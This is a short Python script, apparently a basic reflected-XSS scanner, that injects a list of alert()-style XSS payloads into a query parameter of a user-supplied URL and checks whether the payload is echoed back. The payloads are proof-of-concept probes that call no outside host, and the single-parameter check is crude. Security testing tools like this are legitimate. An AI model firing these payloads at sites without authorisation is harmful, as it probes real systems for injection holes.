import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urlunparse, urlencode, parse_qs

XSS_PAYLOADS = [
    "'>\"><script>alert('XSS')</script>",
    "'>\"><img src=x onerror=alert('XSS')>",
    "'>\"><svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    # Add more XSS payloads as needed
]

def inject_payload(url, payload):
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    query_params['xss_payload'] = payload
    new_query = urlencode(query_params, doseq=True)
    injected_url = urlunparse(parsed_url._replace(query=new_query))
    return injected_url

def detect_xss(url):
    for payload in XSS_PAYLOADS:
        injected_url = inject_payload(url, payload)
        response = requests.get(injected_url)
        soup = BeautifulSoup(response.text, 'html.parser')

        if payload in str(soup):
            return True
    return False

def main():
    url = input("Enter the URL to scan: ")
    if detect_xss(url):
        print("Potential XSS vulnerability detected.")
    else:
        print("No XSS vulnerability detected.")

if __name__ == "__main__":
    main()
